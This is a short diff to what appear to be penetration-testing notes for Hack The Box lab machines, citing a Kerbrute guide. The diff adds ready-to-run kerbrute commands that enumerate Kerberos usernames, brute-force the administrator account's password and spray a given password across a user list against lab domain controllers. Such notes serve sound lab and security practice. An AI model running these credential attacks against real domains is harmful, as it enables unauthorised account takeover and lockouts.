@@ -3,8 +3,8 @@ https://hackingarticles.in/a-detailed-guide-on-kerbrute/
 
 ```
 ./kerbrute userenum --dc dc01.ghost.htb -d ghost.htb ~/wordlists/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
-```
 
-```
 ./kerbrute bruteuser --dc dc01.ghost.htb -d ghost.htb ~/wordlists/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt administrator
+
+./kerbrute passwordspray --dc dc01.infiltrator.htb -d infiltrator.htb users.txt 'WAT?watismypass!'
 ```
